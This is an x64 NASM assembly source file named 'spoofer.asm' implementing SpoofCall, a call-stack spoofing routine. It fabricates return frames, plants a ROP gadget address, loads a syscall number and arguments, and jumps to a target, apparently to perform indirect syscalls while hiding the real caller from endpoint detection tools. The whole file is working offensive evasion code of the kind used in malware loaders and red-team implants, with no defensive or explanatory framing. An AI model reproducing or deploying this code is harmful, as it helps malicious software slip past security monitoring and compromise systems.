; nasm -f win64 spoofer.asm -o spoofer.o
BITS 64
DEFAULT REL

struc STACK_CONFIG
    .pSpoofed1_ret:      RESQ 1
    .Spoofed1StackSize:  RESQ 1
    .pSpoofed2_ret:      RESQ 1
    .Spoofed2StackSize:  RESQ 1
    .pRopGadget:         RESQ 1
    .SpoofedGadgetSize:  RESQ 1
    .pTarget:            RESQ 1
    .pArgs:              RESQ 1
    .dwNumberOfArgs:     RESQ 1
    .ssn:                RESQ 1
endstruc

global SpoofCall

section .bss
    gadget_target   RESQ 1
    saved_rsp       RESQ 1
    saved_ret       RESQ 1

section .text
SpoofCall:
    pop rax
    mov [rel saved_ret], rax        ; save retaddr of caller

    push r14
    push rdi
    push rbx
    push r13
    push r12
    push r15

    mov r13, rcx                    ; r13 = stackConfig ptr
    mov [rel saved_rsp], rsp        ; save rsp for restoration

    push 0                          ; End unwinding marker

    ; === Frame 1 ===
    mov r10, [r13 + STACK_CONFIG.Spoofed1StackSize]
    sub rsp, r10
    mov r10, [r13 + STACK_CONFIG.pSpoofed1_ret]
    mov [rsp], r10

    ; === Frame 2 ===
    mov r10, [r13 + STACK_CONFIG.Spoofed2StackSize]
    sub rsp, r10
    mov r10, [r13 + STACK_CONFIG.pSpoofed2_ret]
    mov [rsp], r10

    ; === Frame 3 (Gadget) ===
    mov r10, [r13 + STACK_CONFIG.SpoofedGadgetSize]
    sub rsp, r10

    ; --- Argument Loading ---
    mov rax, [r13 + STACK_CONFIG.pArgs]
    mov rcx, [rax + 0x00]           ; r10 will be set later
    mov rdx, [rax + 0x08]
    mov r8,  [rax + 0x10]
    mov r9,  [rax + 0x18]

    ; --- Advanced Argument Handling ---
    ; Allocate 0x20 (Shadow space) + (N-4)*8 (extra args)
    mov r11, [r13 + STACK_CONFIG.dwNumberOfArgs]
    mov r12, 0x20                   ; Minimum shadow space
    cmp r11, 4
    jle .apply_allocation
    
    lea r12, [r12 + (r11 - 4) * 8]  ; 0x20 + extra args

.apply_allocation:
    sub rsp, r12
    and rsp, -16 ; align the stack on %16 !

    mov r10, [r13 + STACK_CONFIG.pRopGadget]
    mov [rsp + r12], r10  ; Place le gadget juste au-dessus du shadow space
    ; Copy stack arguments (arg4+) if they exist
    cmp r11, 4
    jle .setup_rbx
    
    mov r14, r11
    sub r14, 4                      ; Number of stack args
.stack_args_loop:
    dec r14
    mov r15, [rax + 0x20 + r14 * 8] ; 0x20 for the 4 args in regs
    mov [rsp + 0x20 + r14 * 8], r15 ; Place above shadow space (0x20 for the shadow space)
    test r14, r14
    jnz .stack_args_loop

.setup_rbx:
    lea rax, [rel gadget_fallback]
    mov [rel gadget_target], rax
    lea rbx, [rel gadget_target]

    mov r10, rcx                    ; Syscall convention: RCX -> R10
    mov eax, [r13 + STACK_CONFIG.ssn] 
    nop
    mov r11, [r13 + STACK_CONFIG.pTarget] ; Use r11 to avoid clobbering eax/rax
    jmp r11

gadget_fallback:
    mov rsp, [rel saved_rsp]
    pop r15
    pop r12
    pop r13
    pop rbx
    pop rdi
    pop r14
    jmp [rel saved_ret]